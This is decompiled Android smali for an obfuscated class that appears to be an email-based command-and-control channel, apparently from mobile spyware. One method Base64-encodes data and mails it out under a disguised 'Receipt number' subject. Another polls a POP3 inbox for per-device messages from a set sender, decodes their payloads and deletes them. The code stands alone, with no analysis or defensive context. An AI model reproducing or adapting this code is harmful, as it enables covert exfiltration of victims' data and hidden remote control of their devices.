.class public final Lsysda/f/c;
.super Ljava/lang/Object;


# static fields
.field private static a:Z

.field private static b:Ljavax/mail/Session;

.field private static c:Ljavax/mail/Session;

.field private static d:Lsysda/f/d;

.field private static e:Ljava/lang/String;

.field private static f:Ljava/lang/String;

.field private static g:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const/4 v1, 0x0

    const/4 v0, 0x0

    sput-boolean v0, Lsysda/f/c;->a:Z

    sput-object v1, Lsysda/f/c;->b:Ljavax/mail/Session;

    sput-object v1, Lsysda/f/c;->c:Ljavax/mail/Session;

    sput-object v1, Lsysda/f/c;->d:Lsysda/f/d;

    const-string v0, ""

    sput-object v0, Lsysda/f/c;->e:Ljava/lang/String;

    const-string v0, ""

    sput-object v0, Lsysda/f/c;->f:Ljava/lang/String;

    const-string v0, ""

    sput-object v0, Lsysda/f/c;->g:Ljava/lang/String;

    return-void
.end method

.method public static a([BII)I
    .locals 5

    const/16 v0, 0x64

    sget-boolean v1, Lsysda/f/c;->a:Z

    if-nez v1, :cond_1

    :cond_0
    :goto_0
    return v0

    :cond_1
    const/4 v1, 0x2

    :try_start_0
    invoke-static {p0, p1, p2, v1}, Landroid/util/Base64;->encodeToString([BIII)Ljava/lang/String;

    move-result-object v1

    invoke-static {}, Lsysda/h;->e()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_0

    new-instance v0, Ljavax/mail/internet/MimeMessage;

    sget-object v3, Lsysda/f/c;->b:Ljavax/mail/Session;

    invoke-direct {v0, v3}, Ljavax/mail/internet/MimeMessage;-><init>(Ljavax/mail/Session;)V

    new-instance v3, Ljavax/mail/internet/InternetAddress;

    sget-object v4, Lsysda/f/c;->f:Ljava/lang/String;

    invoke-direct {v3, v4}, Ljavax/mail/internet/InternetAddress;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v3}, Ljavax/mail/internet/MimeMessage;->setFrom(Ljavax/mail/Address;)V

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Receipt number: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljavax/mail/internet/MimeMessage;->setSubject(Ljava/lang/String;)V

    sget-object v2, Ljavax/mail/Message$RecipientType;->TO:Ljavax/mail/Message$RecipientType;

    new-instance v3, Ljavax/mail/internet/InternetAddress;

    sget-object v4, Lsysda/f/c;->e:Ljava/lang/String;

    invoke-direct {v3, v4}, Ljavax/mail/internet/InternetAddress;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v2, v3}, Ljavax/mail/internet/MimeMessage;->setRecipient(Ljavax/mail/Message$RecipientType;Ljavax/mail/Address;)V

    invoke-virtual {v0, v1}, Ljavax/mail/internet/MimeMessage;->setText(Ljava/lang/String;)V

    invoke-static {v0}, Ljavax/mail/Transport;->send(Ljavax/mail/Message;)V

    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v0

    sput-wide v0, Lsysda/b;->f:J
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/4 v0, 0x0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    const-string v1, "rejected"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_2

    const/16 v0, 0x6b

    goto :goto_0

    :cond_2
    const/16 v0, 0x66

    goto :goto_0
.end method

.method public static a()Z
    .locals 1

    sget-boolean v0, Lsysda/f/c;->a:Z

    return v0
.end method

.method public static b()V
    .locals 6

    const/4 v5, 0x2

    const/4 v4, 0x1

    new-instance v0, Lsysda/f/d;

    sget-object v1, Lsysda/h;->a:Lsysda/l;

    iget-object v1, v1, Lsysda/l;->k:Ljava/lang/String;

    sget-object v2, Lsysda/h;->a:Lsysda/l;

    iget-object v2, v2, Lsysda/l;->l:Ljava/lang/String;

    invoke-direct {v0, v1, v2}, Lsysda/f/d;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    sput-object v0, Lsysda/f/c;->d:Lsysda/f/d;

    sget-object v0, Lsysda/h;->a:Lsysda/l;

    iget-object v0, v0, Lsysda/l;->j:Ljava/lang/String;

    sput-object v0, Lsysda/f/c;->e:Ljava/lang/String;

    sget-object v0, Lsysda/h;->a:Lsysda/l;

    iget-object v0, v0, Lsysda/l;->k:Ljava/lang/String;

    sput-object v0, Lsysda/f/c;->f:Ljava/lang/String;

    sget-object v0, Lsysda/h;->a:Lsysda/l;

    iget-object v0, v0, Lsysda/l;->m:Lsysda/b/f;

    iget-object v0, v0, Lsysda/b/f;->a:Ljava/lang/String;

    sput-object v0, Lsysda/f/c;->g:Ljava/lang/String;

    new-instance v0, Ljava/util/Properties;

    invoke-direct {v0}, Ljava/util/Properties;-><init>()V

    sget-object v1, Lsysda/h;->a:Lsysda/l;

    iget-object v1, v1, Lsysda/l;->n:Lsysda/b/f;

    iget v1, v1, Lsysda/b/f;->b:I

    invoke-static {v1}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v1

    const-string v2, "mail.transport.protocol"

    const-string v3, "smtp"

    invoke-virtual {v0, v2, v3}, Ljava/util/Properties;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Object;

    const-string v2, "mail.host"

    sget-object v3, Lsysda/h;->a:Lsysda/l;

    iget-object v3, v3, Lsysda/l;->n:Lsysda/b/f;

    iget-object v3, v3, Lsysda/b/f;->a:Ljava/lang/String;

    invoke-virtual {v0, v2, v3}, Ljava/util/Properties;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Object;

    const-string v2, "mail.smtp.auth"

    const-string v3, "true"

    invoke-virtual {v0, v2, v3}, Ljava/util/Properties;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Object;

    const-string v2, "mail.smtp.port"

    invoke-virtual {v0, v2, v1}, Ljava/util/Properties;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Object;

    const-string v2, "mail.smtp.socketFactory.port"

    invoke-virtual {v0, v2, v1}, Ljava/util/Properties;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Object;

    const-string v1, "mail.smtp.quitwait"

    const-string v2, "false"

    invoke-virtual {v0, v1, v2}, Ljava/util/Properties;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Object;

    sget-object v1, Lsysda/h;->a:Lsysda/l;

    iget v1, v1, Lsysda/l;->p:I

    if-ne v1, v4, :cond_2

    const-string v1, "mail.smtp.socketFactory.class"

    const-string v2, "javax.net.ssl.SSLSocketFactory"

    invoke-virtual {v0, v1, v2}, Ljava/util/Properties;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Object;

    const-string v1, "mail.smtp.socketFactory.fallback"

    const-string v2, "false"

    invoke-virtual {v0, v1, v2}, Ljava/util/Properties;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Object;

    :cond_0
    :goto_0
    sget-object v1, Lsysda/f/c;->d:Lsysda/f/d;

    invoke-static {v0, v1}, Ljavax/mail/Session;->getDefaultInstance(Ljava/util/Properties;Ljavax/mail/Authenticator;)Ljavax/mail/Session;

    move-result-object v0

    sput-object v0, Lsysda/f/c;->b:Ljavax/mail/Session;

    new-instance v0, Ljava/util/Properties;

    invoke-direct {v0}, Ljava/util/Properties;-><init>()V

    sget-object v1, Lsysda/h;->a:Lsysda/l;

    iget-object v1, v1, Lsysda/l;->m:Lsysda/b/f;

    iget v1, v1, Lsysda/b/f;->b:I

    invoke-static {v1}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v1

    const-string v2, "mail.store.protocol"

    const-string v3, "pop3"

    invoke-virtual {v0, v2, v3}, Ljava/util/Properties;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Object;

    const-string v2, "mail.pop3.host"

    sget-object v3, Lsysda/f/c;->g:Ljava/lang/String;

    invoke-virtual {v0, v2, v3}, Ljava/util/Properties;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Object;

    const-string v2, "mail.pop3.port"

    invoke-virtual {v0, v2, v1}, Ljava/util/Properties;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Object;

    const-string v2, "mail.pop3.socketFactory.port"

    invoke-virtual {v0, v2, v1}, Ljava/util/Properties;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Object;

    sget-object v1, Lsysda/h;->a:Lsysda/l;

    iget v1, v1, Lsysda/l;->o:I

    if-ne v1, v4, :cond_3

    const-string v1, "mail.pop3.socketFactory.class"

    const-string v2, "javax.net.ssl.SSLSocketFactory"

    invoke-virtual {v0, v1, v2}, Ljava/util/Properties;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Object;

    const-string v1, "mail.pop3.socketFactory.fallback"

    const-string v2, "false"

    invoke-virtual {v0, v1, v2}, Ljava/util/Properties;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Object;

    :cond_1
    :goto_1
    invoke-static {v0}, Ljavax/mail/Session;->getInstance(Ljava/util/Properties;)Ljavax/mail/Session;

    move-result-object v0

    sput-object v0, Lsysda/f/c;->c:Ljavax/mail/Session;

    sput-boolean v4, Lsysda/f/c;->a:Z

    return-void

    :cond_2
    sget-object v1, Lsysda/h;->a:Lsysda/l;

    iget v1, v1, Lsysda/l;->p:I

    if-ne v1, v5, :cond_0

    const-string v1, "mail.smtp.starttls.enable"

    const-string v2, "true"

    invoke-virtual {v0, v1, v2}, Ljava/util/Properties;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Object;

    goto :goto_0

    :cond_3
    sget-object v1, Lsysda/h;->a:Lsysda/l;

    iget v1, v1, Lsysda/l;->o:I

    if-ne v1, v5, :cond_1

    const-string v1, "mail.pop3.starttls.enable"

    const-string v2, "true"

    invoke-virtual {v0, v1, v2}, Ljava/util/Properties;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Object;

    goto :goto_1
.end method

.method public static c()V
    .locals 1

    const/4 v0, 0x0

    sput-object v0, Lsysda/f/c;->b:Ljavax/mail/Session;

    sput-object v0, Lsysda/f/c;->c:Ljavax/mail/Session;

    const/4 v0, 0x0

    sput-boolean v0, Lsysda/f/c;->a:Z

    return-void
.end method

.method public static d()Ljava/util/ArrayList;
    .locals 11

    const/4 v3, 0x0

    const/4 v0, 0x0

    const/4 v10, 0x1

    sget-boolean v1, Lsysda/f/c;->a:Z

    if-nez v1, :cond_1

    sget-object v1, Lsysda/f/c;->c:Ljavax/mail/Session;

    if-eqz v1, :cond_1

    :cond_0
    :goto_0
    return-object v0

    :cond_1
    const/4 v1, 0x0

    :try_start_0
    invoke-static {}, Lsysda/h;->e()Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_6
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    move-result-object v5

    if-nez v5, :cond_2

    if-eqz v0, :cond_0

    :try_start_1
    invoke-virtual {v1}, Ljavax/mail/Folder;->isOpen()Z

    move-result v2

    if-eqz v2, :cond_0

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Ljavax/mail/Folder;->close(Z)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    goto :goto_0

    :cond_2
    :try_start_2
    sget-object v1, Lsysda/f/c;->c:Ljavax/mail/Session;

    const-string v2, "pop3"

    invoke-virtual {v1, v2}, Ljavax/mail/Session;->getStore(Ljava/lang/String;)Ljavax/mail/Store;

    move-result-object v1

    sget-object v2, Lsysda/f/c;->g:Ljava/lang/String;

    sget-object v4, Lsysda/f/c;->d:Lsysda/f/d;

    invoke-virtual {v4}, Lsysda/f/d;->getPasswordAuthentication()Ljavax/mail/PasswordAuthentication;

    move-result-object v4

    invoke-virtual {v4}, Ljavax/mail/PasswordAuthentication;->getUserName()Ljava/lang/String;

    move-result-object v4

    sget-object v6, Lsysda/f/c;->d:Lsysda/f/d;

    invoke-virtual {v6}, Lsysda/f/d;->getPasswordAuthentication()Ljavax/mail/PasswordAuthentication;

    move-result-object v6

    invoke-virtual {v6}, Ljavax/mail/PasswordAuthentication;->getPassword()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v2, v4, v6}, Ljavax/mail/Store;->connect(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "Inbox"

    invoke-virtual {v1, v2}, Ljavax/mail/Store;->getFolder(Ljava/lang/String;)Ljavax/mail/Folder;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_6
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    move-result-object v2

    const/4 v1, 0x2

    :try_start_3
    invoke-virtual {v2, v1}, Ljavax/mail/Folder;->open(I)V

    invoke-virtual {v2}, Ljavax/mail/Folder;->getMessages()[Ljavax/mail/Message;

    move-result-object v6

    if-eqz v6, :cond_3

    array-length v1, v6
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    if-nez v1, :cond_4

    :cond_3
    if-eqz v2, :cond_0

    :try_start_4
    invoke-virtual {v2}, Ljavax/mail/Folder;->isOpen()Z

    move-result v1

    if-eqz v1, :cond_0

    const/4 v1, 0x1

    invoke-virtual {v2, v1}, Ljavax/mail/Folder;->close(Z)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_0

    :catch_1
    move-exception v1

    goto :goto_0

    :cond_4
    move v4, v3

    :goto_1
    :try_start_5
    array-length v1, v6

    if-ge v4, v1, :cond_7

    array-length v1, v6

    add-int/lit8 v1, v1, -0x1

    :goto_2
    if-le v1, v4, :cond_6

    aget-object v7, v6, v1

    invoke-virtual {v7}, Ljavax/mail/Message;->getSentDate()Ljava/util/Date;

    move-result-object v7

    add-int/lit8 v8, v1, -0x1

    aget-object v8, v6, v8

    invoke-virtual {v8}, Ljavax/mail/Message;->getSentDate()Ljava/util/Date;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/util/Date;->compareTo(Ljava/util/Date;)I

    move-result v7

    if-gez v7, :cond_5

    aget-object v7, v6, v1

    add-int/lit8 v8, v1, -0x1

    aget-object v8, v6, v8

    aput-object v8, v6, v1

    add-int/lit8 v8, v1, -0x1

    aput-object v7, v6, v8

    :cond_5
    add-int/lit8 v1, v1, -0x1

    goto :goto_2

    :cond_6
    add-int/lit8 v1, v4, 0x1

    move v4, v1

    goto :goto_1

    :cond_7
    new-instance v1, Ljava/util/ArrayList;

    array-length v4, v6

    invoke-direct {v1, v4}, Ljava/util/ArrayList;-><init>(I)V

    :goto_3
    array-length v4, v6

    if-ge v3, v4, :cond_d

    aget-object v4, v6, v3

    invoke-virtual {v4}, Ljavax/mail/Message;->getSubject()Ljava/lang/String;

    move-result-object v4

    const/16 v7, 0x20

    invoke-virtual {v4, v7}, Ljava/lang/String;->lastIndexOf(I)I

    move-result v4

    if-gez v4, :cond_9

    aget-object v4, v6, v3

    sget-object v7, Ljavax/mail/Flags$Flag;->DELETED:Ljavax/mail/Flags$Flag;

    const/4 v8, 0x1

    invoke-virtual {v4, v7, v8}, Ljavax/mail/Message;->setFlag(Ljavax/mail/Flags$Flag;Z)V

    :cond_8
    :goto_4
    add-int/lit8 v3, v3, 0x1

    goto :goto_3

    :cond_9
    aget-object v7, v6, v3

    invoke-virtual {v7}, Ljavax/mail/Message;->getSubject()Ljava/lang/String;

    move-result-object v7

    add-int/lit8 v4, v4, 0x1

    invoke-virtual {v7, v4}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v5, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-nez v7, :cond_b

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v7

    const/4 v8, 0x5

    if-le v7, v8, :cond_a

    const/4 v7, 0x2

    invoke-static {v4, v7}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v4

    new-instance v7, Ljava/io/ByteArrayInputStream;

    invoke-direct {v7, v4}, Ljava/io/ByteArrayInputStream;-><init>([B)V

    new-instance v4, Ljava/io/DataInputStream;

    invoke-direct {v4, v7}, Ljava/io/DataInputStream;-><init>(Ljava/io/InputStream;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    :try_start_6
    invoke-static {v4}, Lsysda/a/d;->b(Ljava/io/InputStream;)I
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    move-result v8

    const v9, -0x21524111

    if-eq v8, v9, :cond_8

    :goto_5
    :try_start_7
    invoke-virtual {v4}, Ljava/io/DataInputStream;->close()V

    invoke-virtual {v7}, Ljava/io/ByteArrayInputStream;->close()V

    :cond_a
    aget-object v4, v6, v3

    sget-object v7, Ljavax/mail/Flags$Flag;->DELETED:Ljavax/mail/Flags$Flag;

    const/4 v8, 0x1

    invoke-virtual {v4, v7, v8}, Ljavax/mail/Message;->setFlag(Ljavax/mail/Flags$Flag;Z)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2
    .catchall {:try_start_7 .. :try_end_7} :catchall_0

    goto :goto_4

    :catch_2
    move-exception v1

    move-object v1, v2

    :goto_6
    if-eqz v1, :cond_0

    :try_start_8
    invoke-virtual {v1}, Ljavax/mail/Folder;->isOpen()Z

    move-result v2

    if-eqz v2, :cond_0

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Ljavax/mail/Folder;->close(Z)V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_3

    goto/16 :goto_0

    :catch_3
    move-exception v1

    goto/16 :goto_0

    :cond_b
    :try_start_9
    aget-object v4, v6, v3

    invoke-virtual {v4}, Ljavax/mail/Message;->getFrom()[Ljavax/mail/Address;

    move-result-object v4

    if-eqz v4, :cond_8

    array-length v7, v4

    if-ne v7, v10, :cond_8

    const/4 v7, 0x0

    aget-object v4, v4, v7

    invoke-virtual {v4}, Ljavax/mail/Address;->toString()Ljava/lang/String;

    move-result-object v4

    sget-object v7, Lsysda/f/c;->e:Ljava/lang/String;

    invoke-virtual {v4, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_8

    aget-object v4, v6, v3

    invoke-virtual {v4}, Ljavax/mail/Message;->getContentType()Ljava/lang/String;

    move-result-object v4

    const-string v7, "text/plain"

    invoke-virtual {v4, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_8

    aget-object v4, v6, v3

    invoke-virtual {v4}, Ljavax/mail/Message;->getInputStream()Ljava/io/InputStream;

    move-result-object v4

    invoke-virtual {v4}, Ljava/io/InputStream;->available()I

    move-result v7

    new-array v7, v7, [B

    invoke-virtual {v4, v7}, Ljava/io/InputStream;->read([B)I

    const/4 v4, 0x2

    invoke-static {v7, v4}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    aget-object v4, v6, v3

    sget-object v7, Ljavax/mail/Flags$Flag;->DELETED:Ljavax/mail/Flags$Flag;

    const/4 v8, 0x1

    invoke-virtual {v4, v7, v8}, Ljavax/mail/Message;->setFlag(Ljavax/mail/Flags$Flag;Z)V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_2
    .catchall {:try_start_9 .. :try_end_9} :catchall_0

    goto/16 :goto_4

    :catchall_0
    move-exception v0

    :goto_7
    if-eqz v2, :cond_c

    :try_start_a
    invoke-virtual {v2}, Ljavax/mail/Folder;->isOpen()Z

    move-result v1

    if-eqz v1, :cond_c

    const/4 v1, 0x1

    invoke-virtual {v2, v1}, Ljavax/mail/Folder;->close(Z)V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_5

    :cond_c
    :goto_8
    throw v0

    :cond_d
    if-eqz v2, :cond_e

    :try_start_b
    invoke-virtual {v2}, Ljavax/mail/Folder;->isOpen()Z

    move-result v0

    if-eqz v0, :cond_e

    const/4 v0, 0x1

    invoke-virtual {v2, v0}, Ljavax/mail/Folder;->close(Z)V
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_7

    :cond_e
    :goto_9
    move-object v0, v1

    goto/16 :goto_0

    :catch_4
    move-exception v8

    goto/16 :goto_5

    :catch_5
    move-exception v1

    goto :goto_8

    :catchall_1
    move-exception v1

    move-object v2, v0

    move-object v0, v1

    goto :goto_7

    :catch_6
    move-exception v1

    move-object v1, v0

    goto/16 :goto_6

    :catch_7
    move-exception v0

    goto :goto_9
.end method
